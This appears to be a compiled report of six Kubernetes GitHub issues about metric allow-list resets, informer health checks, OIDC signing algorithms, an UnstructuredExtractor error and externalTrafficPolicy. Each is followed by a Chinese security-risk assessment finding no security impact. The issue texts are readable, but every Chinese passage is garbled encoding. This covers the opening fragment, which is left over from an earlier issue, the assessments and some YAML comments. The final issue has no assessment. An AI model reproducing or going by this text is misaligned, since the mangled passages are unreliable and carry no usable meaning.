è¯¥Issueè®¨è®ºäº†code-generatorçš„`--build-tag`å‚æ•°åœ¨ç‰ˆæœ¬1.30ä¸­è¢«ç§»é™¤ï¼Œå¯¼è‡´æ— æ³•åœ¨`conversion-gen`å’Œ`defaulter-gen`è¿‡ç¨‹ä¸­æ³¨å…¥è‡ªå®šä¹‰çš„build tagã€‚è¿™ä½¿å¾—ä¸€äº›éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰build tagæ¥åŒ…å«ç‰¹å®šç”Ÿæˆæ–‡ä»¶çš„é¡¹ç›®å—åˆ°å½±å“ã€‚ç„¶è€Œï¼Œä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜å¹¶æœªå¼•å…¥å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿæœªå¯¼è‡´æ–°çš„æ¼æ´äº§ç”Ÿã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128246 Unable to reset metric's LabelValueAllowLists during test

- Issue é“¾æ¥ï¼š[#128246](https://github.com/kubernetes/kubernetes/issues/128246)

### Issue å†…å®¹

#### What happened?

While trying to add an integration test for `--allow-metric-labels` #128166 (more specifically, on this [commit](https://github.com/kubernetes/kubernetes/commit/36230b63ffd96b8fbe8acb50cf91bf8c9665793a)), I find that metrics' `LabelValueAllowLists` don't reset between tests though TestAPIServers are torn down and brought up in each tests. It caused the integration test failed because the `--allow-metric-labels` doesn't reflect on the targeted metric.

It should be due to that kube-apiserver metrics (and most system component metrics) are global(package level) variables and their [opts](https://github.com/kubernetes/kubernetes/blob/81ce66f059ec9c07cccf4069c8913e31959dea78/staging/src/k8s.io/component-base/metrics/opts.go#L57) are set once when they are imported and cannot be reset afterwards.

#### What did you expect to happen?

There is a way to reset the `LabelValueAllowLists` [opts](https://github.com/kubernetes/kubernetes/blob/81ce66f059ec9c07cccf4069c8913e31959dea78/staging/src/k8s.io/component-base/metrics/opts.go#L57) in the test.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Add a test https://github.com/kubernetes/kubernetes/commit/e62ab1c2a172cbd04245f672e270169a0a8e041e
2. Run test suite on entire package, it would fail.
 ```
go test -v -timeout 30s k8s.io/kubernetes/test/integration/metrics
```
3. However, it would always success when only run the targeted test or comment out all the rest of the tests.
```
go test -v -timeout 30s k8s.io/kubernetes/test/integration/metrics -run ^testAPIServerMetricsLabelsWithAllowList$
```


#### Anything else we need to know?

Solution options:

Option1: Add a `ResetLabelAllowList()` API to the Vec metrics and wrap it with `RestLabelAllowListForTest()` in the system component metrics packages.

Option2: Include the reset label allow list logic inside the current `Reset()` API, which can reduce the effort for extra adoption for the option1's new introduced API.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-alpha.1.300+55b83c92b3b69c-dirty
```
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨è¿›è¡Œé›†æˆæµ‹è¯•æ—¶ï¼Œæ— æ³•åœ¨æµ‹è¯•ä¹‹é—´é‡ç½®metricsçš„`LabelValueAllowLists`ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ã€‚åŸå› æ˜¯kube-apiserverçš„metricsï¼ˆä»¥åŠå¤§å¤šæ•°ç³»ç»Ÿç»„ä»¶çš„metricsï¼‰æ˜¯å…¨å±€å˜é‡ï¼Œå…¶é€‰é¡¹åœ¨å¯¼å…¥æ—¶åªè®¾ç½®ä¸€æ¬¡ï¼Œä¹‹åæ— æ³•é‡ç½®ã€‚è¿™å¯¼è‡´äº†`--allow-metric-labels`å‚æ•°åœ¨æµ‹è¯•ä¸­æ— æ³•åæ˜ åˆ°ç›®æ ‡metricä¸Šã€‚

è¿™ä¸ªé—®é¢˜ä¸»è¦å½±å“æµ‹è¯•ç¯å¢ƒï¼Œå¯¼è‡´æµ‹è¯•ç»“æœä¸å‡†ç¡®æˆ–å¤±è´¥ã€‚ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œmetricsçš„`LabelValueAllowLists`ä¸ä¼šé¢‘ç¹é‡ç½®ï¼Œå› æ­¤è¿™ç§æƒ…å†µä¸‹çš„é™åˆ¶ä¸ä¼šå¯¹ç³»ç»Ÿçš„å®‰å…¨æ€§äº§ç”Ÿå½±å“ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼š**å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚å› æ­¤ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128233 controllers: Check if informers are synced on `/healthz`/`/readyz`?

- Issue é“¾æ¥ï¼š[#128233](https://github.com/kubernetes/kubernetes/issues/128233)

### Issue å†…å®¹

#### What happened?

Right now the kube-apiserver has a readyz check if the informers are synced: 

```
% kubectl get --raw='/readyz/informer-sync'
ok
```

The corresponding source code:
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/staging/src/k8s.io/apiserver/pkg/server/healthz/healthz.go#L95-L122
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/staging/src/k8s.io/apiserver/pkg/server/config.go#L897-L901

However, there is no such healthz/readyz check for controllers (kube-controller-manager, kube-scheduler, etc.).

I was wondering whether it would make sense to add such checks if informers are synced. Informers can get out of sync. If we bind this condition to the `/healthz` endpoint and then the `/healthz` endpoint to the liveness probe, then kubelet can restart the Pod if the informer is not synced.

I was wondering while working with informers should the `HasSynced` be checked only on startup or should it be checked periodically?

I am not an expert in the topic. Feel free to comment if the proposal makes sense or not.

kube-controller-manager's `/healthz` endpoint returns status for the various controllers:
```
$ curl -k https://localhost:10257/healthz?verbose
[+]leaderElection ok
[+]serviceaccount-token-controller ok
[+]cronjob-controller ok
[+]certificatesigningrequest-signing-controller ok
[+]node-lifecycle-controller ok
[+]endpointslice-controller ok
[+]daemonset-controller ok
[+]statefulset-controller ok
[+]bootstrap-signer-controller ok
[+]persistentvolumeclaim-protection-controller ok
[+]persistentvolume-protection-controller ok
[+]garbage-collector-controller ok
[+]job-controller ok
[+]deployment-controller ok
[+]node-ipam-controller ok
[+]persistentvolume-attach-detach-controller ok
[+]validatingadmissionpolicy-status-controller ok
[+]endpoints-controller ok
[+]certificatesigningrequest-cleaner-controller ok
[+]persistentvolume-binder-controller ok
[+]ttl-after-finished-controller ok
[+]ephemeral-volume-controller ok
[+]resourcequota-controller ok
[+]namespace-controller ok
[+]replicaset-controller ok
[+]ttl-controller ok
[+]legacy-serviceaccount-token-cleaner-controller ok
[+]endpointslice-mirroring-controller ok
[+]pod-garbage-collector-controller ok
[+]disruption-controller ok
[+]token-cleaner-controller ok
[+]persistentvolume-expander-controller ok
[+]replicationcontroller-controller ok
[+]serviceaccount-controller ok
[+]horizontal-pod-autoscaler-controller ok
[+]certificatesigningrequest-approving-controller ok
[+]clusterrole-aggregation-controller ok
[+]root-ca-certificate-publisher-controller ok
[+]taint-eviction-controller ok
healthz check passed
```

However, I am not sure if there is a meaningful check behind it. 
According to https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/cmd/kube-controller-manager/app/controllermanager.go#L779-L795, `controllerhealthz.NamedPingChecker` is being used as I don't see implementation of `controller.HealthCheckable` in the source code. It always returns `nil` (reports no issues; does not perform a meaningful check).

#### What did you expect to happen?

Issues with the underlying informers to be reflected in `/healthz`/`/readyz` endpoints for controller components like kube-controller-manager, kube-proxy, etc.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Start kube-controller-manager with low qps and burst settings to reproduce informers out of sync issues.

```
--kube-api-qps=1
--kube-api-burst=1
```

2. Create a Deployment and scale it to 100 replicas

3. Make sure the kube-controller-manager logs are full with client-side throttling errors
```
I1021 13:24:04.441128       1 request.go:700] Waited for 25.992938012s due to client-side throttling, not priority and fairness, request: POST:https://kube-apiserver/api/v1/namespaces/default/pods
I1021 13:24:05.441182       1 request.go:700] Waited for 26.992997013s due to client-side throttling, not priority and fairness, request: POST:https://kube-apiserver/api/v1/namespaces/default/pods
```

and the issue is not reflected in the `/healthz`/`/readyz` endpoint.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueè®¨è®ºçš„æ˜¯åœ¨kube-controller-managerç­‰æ§åˆ¶å™¨ç»„ä»¶ä¸­æ˜¯å¦éœ€è¦æ·»åŠ InformeråŒæ­¥çš„å¥åº·æ£€æŸ¥ï¼Œä»¥ä¾¿å½“Informerä¸åŒæ­¥æ—¶å¯ä»¥é€šè¿‡`/healthz`æˆ–`/readyz`æ¥å£åæ˜ å‡ºæ¥ï¼Œä»è€Œè§¦å‘kubeleté‡å¯Podã€‚Issueçš„å†…å®¹ä¸»è¦é›†ä¸­åœ¨æ”¹è¿›ç³»ç»Ÿçš„å¥åº·æ£€æŸ¥æœºåˆ¶ï¼Œä»¥æé«˜ç³»ç»Ÿçš„å¥å£®æ€§å’Œå¯ç”¨æ€§ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥Issueæœªæ¶‰åŠå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„é£é™©ã€‚
2. è¯¥Issueæœªå¼•å…¥å¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ï¼ŒæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œæ— æ³•è¯„å®šä¸ºé«˜é£é™©ã€‚
6. è¯¥Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

å› æ­¤ï¼Œæœ¬Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128210 Teste

- Issue é“¾æ¥ï¼š[#128210](https://github.com/kubernetes/kubernetes/issues/128210)

### Issue å†…å®¹

#### What happened?

teste

#### What did you expect to happen?

teste

#### How can we reproduce it (as minimally and precisely as possible)?

teste

#### Anything else we need to know?

teste

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueçš„æ ‡é¢˜å’Œå†…å®¹éƒ½æ˜¯â€œTesteâ€ï¼Œæ²¡æœ‰æä¾›ä»»ä½•å…·ä½“çš„ä¿¡æ¯ã€æè¿°æˆ–ä¸Šä¸‹æ–‡ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠä»»ä½•å®‰å…¨ç›¸å…³çš„é—®é¢˜æˆ–æ½œåœ¨é£é™©ã€‚å› æ­¤ï¼Œæ— æ³•ä»ä¸­åˆ†æå‡ºä»»ä½•æ½œåœ¨çš„å®‰å…¨é£é™©æˆ–æ¼æ´ã€‚

---

## Issue #128207 oidc config and AuthenticationConfiguration can not config bothï¼Œbut AuthenticationConfiguration does not have signing-algs configï¼Œlead to problemï¼Ÿ

- Issue é“¾æ¥ï¼š[#128207](https://github.com/kubernetes/kubernetes/issues/128207)

### Issue å†…å®¹

#### What happened?

    - --oidc-signing-algs=RS512

```
apiVersion: apiserver.config.k8s.io/v1beta1
kind: AuthenticationConfiguration
jwt:
- issuer:
    # url åœ¨æ‰€æœ‰è®¤è¯ç»„ä»¶ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚
    # url ä¸å¾—ä¸ --service-account-issuer ä¸­é…ç½®çš„é¢å‘è€…å†²çªã€‚
    url: https://cas.example.org/cas/oidc
    # discoveryURLï¼ˆå¦‚æœæŒ‡å®šï¼‰å°†è¦†ç›–ç”¨äºè·å–å‘ç°ä¿¡æ¯çš„ URLï¼Œè€Œä¸æ˜¯ä½¿ç”¨ â€œ{url}/.well-known/openid-configurationâ€ã€‚
    # ç³»ç»Ÿä¼šä½¿ç”¨æ‰€ç»™çš„é…ç½®å€¼ï¼Œå› æ­¤å¦‚æœéœ€è¦ï¼Œâ€œ/.well-known/openid-configurationâ€ å¿…é¡»åŒ…å«åœ¨ discoveryURL ä¸­ã€‚
    #
    # å–å›çš„å‘ç°ä¿¡æ¯ä¸­çš„ â€œissuerâ€ å­—æ®µå¿…é¡»ä¸ AuthenticationConfiguration ä¸­çš„
    # â€œissuer.urlâ€ å­—æ®µåŒ¹é…ï¼Œå¹¶è¢«ç”¨äºéªŒè¯æ‰€å‘ˆç°çš„ JWT ä¸­çš„ â€œissâ€ å£°æ˜ã€‚
    # è¿™é€‚ç”¨äºä¼—æ‰€å‘¨çŸ¥çš„ç«¯ç‚¹å’Œ jwks ç«¯ç‚¹æ‰˜ç®¡åœ¨ä¸é¢å‘è€…ä¸åŒçš„ä½ç½®ï¼ˆä¾‹å¦‚é›†ç¾¤æœ¬åœ°ï¼‰çš„åœºæ™¯ã€‚
    # discoveryURL å¿…é¡»ä¸ url ä¸åŒï¼ˆå¦‚æœæŒ‡å®šï¼‰ï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰è®¤è¯ç»„ä»¶ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚
    discoveryURL: https://cas.example.org/cas/oidc/.well-known/openid-configuration
    # PEM ç¼–ç çš„ CA è¯ä¹¦ç”¨äºåœ¨è·å–å‘ç°ä¿¡æ¯æ—¶éªŒè¯è¿æ¥ã€‚
    # å¦‚æœæœªè®¾ç½®ï¼Œå°†ä½¿ç”¨ç³»ç»ŸéªŒè¯ç¨‹åºã€‚
    # ä¸ --oidc-ca-file æ ‡å¿—å¼•ç”¨çš„æ–‡ä»¶å†…å®¹çš„å€¼ç›¸åŒã€‚
    certificateAuthority: |
      -----BEGIN CERTIFICATE-----
      MIIDxTCCAq2gAwIBAgIEHSYe8TANBgkqhkiG9w0BAQsFADBHMQswCQYDVQQGEwJV
      UzEMMAoGA1UECxMDT3JnMRAwDgYDVQQLEwdFeGFtcGxlMRgwFgYDVQQDEw9jYXMu
      ZXhhbXBsZS5vcmcwHhcNMjQxMDE0MDQ1MTA5WhcNMjUwMTEyMDQ1MTA5WjBHMQsw
      CQYDVQQGEwJVUzEMMAoGA1UECxMDT3JnMRAwDgYDVQQLEwdFeGFtcGxlMRgwFgYD
      VQQDEw9jYXMuZXhhbXBsZS5vcmcwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
      AoIBAQCu5cxJB7oy812FiREeMAuwRY6zOL+Z0fzzL2+yNB62drf8++xSDWRRIzdW
      d6ao4/8OoZoGf6MwmJimeqzJfgIwAFPWKIXQiWTr1pIt3RmGbMWyMieA6pTu03oa
      dYgDxliPaKyqK3lauQ3hIxOBX5igS+ZFwP00t/KYZLaUYq90E0CfkaaMxDRHpyFa
      L/NTlx7fDe4iJv5e43XqU6mmHxHtdSYkHCXRKb2eqZzipOL4/T9KqyICEOK26mnB
      LDMuGUOhuqTw2/eEcAzpFotu12sYjywe9sbTJZEjVyXpCyIf06A2mh1RzqYZrcdX
      KKu6P2t+Fl5wVwHmr07nUffVjfJdAgMBAAGjgbgwgbUwHQYDVR0OBBYEFAi6kyO7
      eASBkHz1X4mlqvU3ERm7MIGTBgNVHREEgYswgYiCD2Nhcy5leGFtcGxlLm9yZ4IU
      Y2FzYWRtaW4uZXhhbXBsZS5vcmeCFWNhcy1zZXJ2ZXItYm9vdC1hZG1pboIjY2Fz
      LXNlcnZlci0wLmNhcy1zZXJ2ZXIuZGVmYXVsdC5zdmOCI2Nhcy1zZXJ2ZXItMS5j
      YXMtc2VydmVyLmRlZmF1bHQuc3ZjMA0GCSqGSIb3DQEBCwUAA4IBAQA9SR55kjOK
      abIbEFthdg2djwydlBysVyu+C1YQ5ratdryVgnbG9zjsLphGzYXSwdsOjw8VdZiu
      Fk4bEm/6+sFtksMfLza6OJj/Mq0JPTiDQAnvokBgJBllJJmerAbeKwMmpiuYFZPS
      j1A7456JrHnl9T/QREuqYAWt7oyXHKrorLjuPjoe1bqgE/lgIIvDtTuPMrZ3rO/T
      WC4HbBvpm61w1osZzqjitV+qzZkZ50z2oLdkISPaXxWVS5feNga8imijQ4zBMC25
      Ni0pI/FSU7Lx/sP2bSjuC/8H/FBUpeSlzh37/ZRd6H6eR5zw75LykDF85+5L2oNd
      LrfEiw8rsu+s
      -----END CERTIFICATE-----
    # audiences æ˜¯ JWT å¿…é¡»å‘å¸ƒç»™çš„ä¸€ç»„å¯æ¥å—çš„å—ä¼—ã€‚
    # è‡³å°‘å…¶ä¸­ä¸€é¡¹å¿…é¡»ä¸æ‰€æä¾›çš„ JWT ä¸­çš„ â€œaudâ€ å£°æ˜ç›¸åŒ¹é…ã€‚
    audiences:
    - kubernetes # ä¸ --oidc-client-id ä¸€è‡´ã€‚
    # å½“æŒ‡å®šå¤šä¸ªå—ä¼—æ—¶ï¼Œéœ€è¦å°†æ­¤å­—æ®µè®¾ç½®ä¸º â€œMatchAnyâ€ã€‚
    #audienceMatchPolicy: MatchAny
  # ç”¨äºéªŒè¯ä»¤ç‰Œå£°æ˜ä»¥å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯çš„è§„åˆ™ã€‚
  #claimValidationRules:
    # ä¸ --oidc-required-claim key=value ä¸€è‡´
  #- expression: 'claims.exp - claims.nbf <= 86400'
  #  message: total token lifetime must not exceed 24 hours
  claimMappings:
    # username è¡¨ç¤ºç”¨æˆ·åå±æ€§çš„é€‰é¡¹ã€‚
    # è¿™æ˜¯å”¯ä¸€å¿…éœ€çš„å±æ€§ã€‚
    username:
      # ä¸ --oidc-username-claim ç›¸åŒï¼Œä¸ username.expression äº’æ–¥ã€‚
      claim: "preferred_username"
      # ä¸ --oidc-username-prefix ç›¸åŒï¼Œä¸ username.expression äº’æ–¥ã€‚
      # å¦‚æœè®¾ç½®äº†username.claimï¼Œåˆ™éœ€è¦username.prefixã€‚
      # å¦‚æœä¸éœ€è¦å‰ç¼€ï¼Œå¯æ˜¾å¼å°†å…¶è®¾ç½®ä¸º ""ã€‚
      prefix: "oidc-"
      # ä¸ username.claim å’Œ username.prefix äº’æ–¥ã€‚
      # expression æ˜¯è®¡ç®—ç»“æœä¸ºå­—ç¬¦ä¸²çš„ CEL è¡¨è¾¾å¼ã€‚
      #
      # 1.  å¦‚æœ username.expression ä½¿ç”¨ â€œclaims.emailâ€ï¼Œåˆ™å¿…é¡»åœ¨ username.expression
      #     æˆ– extra[*].valueExpression æˆ– ClaimValidationRules[*].expression ä¸­ä½¿ç”¨ â€œclaims.email_verifiedâ€ã€‚
      #     ä¸ username.claim è®¾ç½®ä¸º â€œemailâ€ æ—¶è‡ªåŠ¨åº”ç”¨çš„éªŒè¯ç›¸åŒ¹é…çš„ç¤ºä¾‹å£°æ˜éªŒè¯è§„åˆ™è¡¨è¾¾å¼æ˜¯
      #     â€œclaims.?email_verified.orValue(true)â€ã€‚
      # 2.  å¦‚æœæ ¹æ® username.expression æ–­è¨€çš„ç”¨æˆ·åæ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œåˆ™èº«ä»½è®¤è¯è¯·æ±‚å°†å¤±è´¥ã€‚
      #expression: '"oidc:"+claims.preferred_username'
    # groups ä»£è¡¨ groups å±æ€§çš„ä¸€ä¸ªé€‰é¡¹ã€‚
    groups:
      # ä¸ --oidc-groups-claim ç›¸åŒï¼Œä¸ groups.express äº’æ–¥ã€‚
      #claim: "user_groups"
      # ä¸ --oidc-groups-prefix ç›¸åŒã€‚ä¸ groups.express äº’æ–¥ã€‚
      # å¦‚æœè®¾ç½®äº† groups.claimï¼Œåˆ™éœ€è¦ groups.prefixã€‚
      # å¦‚æœä¸éœ€è¦å‰ç¼€ï¼Œåˆ™æ˜¾å¼å°†å…¶è®¾ç½®ä¸º ""ã€‚
      #prefix: "oidc-"  #Invalid value: \"oidc-\": prefix can't be set when expression is set"
      # ä¸ groups.claim å’Œ groups.prefix äº’æ–¥ã€‚
      # expression æ˜¯ä¸€ä¸ªè®¡ç®—ç»“æœä¸ºå­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²åˆ—è¡¨çš„ CEL è¡¨è¾¾å¼ã€‚
      expression: 'claims.group_name.split(",").map(g, "oidc-" + g)'
    # uid è¡¨ç¤º uid å±æ€§çš„ä¸€ä¸ªé€‰é¡¹ã€‚
    uid:
      # ä¸ uid.expression äº’æ–¥ã€‚
      claim: 'preferred_username'
      # ä¸ uid.claim äº’æ–¥
      # expression æ˜¯è®¡ç®—ç»“æœä¸ºå­—ç¬¦ä¸²çš„ CEL è¡¨è¾¾å¼ã€‚
      #expression: 'claims.preferred_username'
  # åº”ç”¨äºæœ€ç»ˆç”¨æˆ·å¯¹è±¡çš„éªŒè¯è§„åˆ™ã€‚
  userValidationRules:
    # expression æ˜¯ä¸€ä¸ªè®¡ç®—ç»“æœä¸ºå¸ƒå°”å€¼çš„ CEL è¡¨è¾¾å¼ã€‚
    # æ‰€æœ‰è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœå¿…é¡»ä¸º trueï¼Œç”¨æˆ·æ‰æœ‰æ•ˆã€‚
  - expression: "!user.username.startsWith('system:')"
    # Message è‡ªå®šä¹‰éªŒè¯å¤±è´¥æ—¶åœ¨ API æœåŠ¡å™¨æ—¥å¿—ä¸­çœ‹åˆ°çš„é”™è¯¯æ¶ˆæ¯ã€‚
    message: 'username cannot used reserved system: prefix'
  - expression: "user.groups.all(group, !group.startsWith('system:'))"
    message: 'groups cannot used reserved system: prefix'
```

```
E1020 08:34:22.274226       1 authentication.go:73] "Unable to authenticate the request" err="[invalid bearer token, oidc: verify token: failed to verify signature: failed to verify id token signature]"
```

#### What did you expect to happen?

command execute right

#### How can we reproduce it (as minimally and precisely as possible)?

config AuthenticationConfiguration  with oidc provider with signing-algs is RS512


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

1.31.0

</details>


#### Cloud provider

<details>
wmware workstation
</details>


#### OS version

<details>

ubuntu 2404

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨ä½¿ç”¨AuthenticationConfigurationé…ç½®OIDCè®¤è¯æ—¶ï¼Œæ— æ³•æŒ‡å®šç­¾åç®—æ³•ï¼ˆsigning-algsï¼‰ï¼Œå¯¼è‡´å½“OIDCæä¾›è€…ä½¿ç”¨éé»˜è®¤ç­¾åç®—æ³•ï¼ˆå¦‚RS512ï¼‰æ—¶ï¼Œè®¤è¯å¤±è´¥ã€‚è¿™æ˜¯ä¸€ä¸ªé…ç½®é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè®¤è¯å¤±è´¥å¹¶æœªå¯¼è‡´æœªæˆæƒè®¿é—®æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ã€‚

---

## Issue #128201 Cannot create UnstructuredExtractor - duplicate entry for /v1, Kind=APIResourceList

- Issue é“¾æ¥ï¼š[#128201](https://github.com/kubernetes/kubernetes/issues/128201)

### Issue å†…å®¹

#### What happened?

I am trying to create an `UnstructuredExtractor`, with the following code (error handling omitted for brevity):

```go
	dynamic, _ := provider.MakeDynamicClient(kubeconfig)
	discovery, _ := provider.MakeDiscoveryClient(kubeconfig)
	extractor, err := acmetav1.NewUnstructuredExtractor(discovery)
```

After this code `err != nil`, with the following error:

```
failed generating initial GVK Parser: duplicate entry for /v1, Kind=APIResourceList
```

Stepping through with a debugger, the stack trace seems to be:
- In [`NewUnstructuredExtractor`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/client-go/applyconfigurations/meta/v1/unstructured.go#L96)
- In [`regenerateGVKParser`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/client-go/applyconfigurations/meta/v1/unstructured.go#L69)
- In [`NewGVKParser`](https://github.com/kubernetes/kubernetes/blob/4f796c02f77fb95d42cd161ea663dd1bf05e372f/staging/src/k8s.io/apimachinery/pkg/util/managedfields/gvkparser.go#L73)

#### What did you expect to happen?

I expect to get an `UnstructuredExtractor`, that I can use to extract fields from an object that were set by my CLI tool.

#### How can we reproduce it (as minimally and precisely as possible)?

This can be reproduced against a `v1.30` or newer (`1.29` is not affected) [kind](https://kind.sigs.k8s.io/) cluster.

```bash
kubectl apply --server-side -f https://raw.githubusercontent.com/projectcalico/calico/v3.28.2/manifests/tigera-operator.yaml
cat <<EOF | kubectl apply --server-side -f -
apiVersion: operator.tigera.io/v1
kind: Installation
metadata:
  name: default
spec: {}
---
apiVersion: operator.tigera.io/v1
kind: APIServer
metadata:
  name: default
spec: {}
EOF
```

This causes the duplication of the `APIResourceList` definition.

Then, it is no longer possible to create an `UnstructuredClient` against the cluster using the code above.

#### Anything else we need to know?

I suspect the bug is in `client-go`, and that `UnstructuredExtractor` should be constructable even in the presence of duplicate resources. I'm not sure if it is possible for the Calico API server to avoid this duplication, given that it supports both `1.29` and `1.30`.

It's also possible that I'm building the `UnstructuredExtractor` wrong, I wasn't able to find many examples.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

None

#### OS version

N/A (reproduces on kind)

#### Install tools

https://kind.sigs.k8s.io/

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæè¿°çš„æ˜¯åœ¨åˆ›å»º`UnstructuredExtractor`æ—¶é‡åˆ°äº†é‡å¤çš„`/v1, Kind=APIResourceList`çš„é—®é¢˜ã€‚è¿™æ˜¯ç”±äºåœ¨é›†ç¾¤ä¸­éƒ¨ç½²äº†Calicoçš„operatoré€ æˆäº†èµ„æºé‡å¤å®šä¹‰ï¼Œå¯¼è‡´äº†å®¢æˆ·ç«¯è°ƒç”¨æ—¶çš„é”™è¯¯ã€‚è¿™å±äºè½¯ä»¶å…¼å®¹æ€§æˆ–é…ç½®é—®é¢˜ï¼Œå¹¶æœªæ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128198 externalTrafficPolicy: local Reverts to cluster When Cluster Lacks PreferDualStack Support

- Issue é“¾æ¥ï¼š[#128198](https://github.com/kubernetes/kubernetes/issues/128198)

### Issue å†…å®¹

#### What happened?

In Kubernetes clusters that do not support PreferDualStack networking, the externalTrafficPolicy: local setting for services is not honored. Instead, the traffic policy reverts to the default externalTrafficPolicy: cluster, which can lead to unintended traffic routing and source IP loss.

#### What did you expect to happen?

The service should honor the externalTrafficPolicy: local setting, ensuring that traffic is routed only to the local node where the service endpoints are available, preserving the client source IP.

#### How can we reproduce it (as minimally and precisely as possible)?

Deploy this to single-stack cluster
```
apiVersion: v1
kind: Service
metadata:
  name: dual-stack-service
  namespace: default
spec:
  ipFamilyPolicy: PreferDualStack
  ipFamilies:
    - IPv4
    - IPv6
  selector:
    app: my-app
  ports:
    - protocol: TCP
      port: 80
      targetPort: 8080
  externalTrafficPolicy: Local
  type: LoadBalancer

```

#### Anything else we need to know?

_No response_

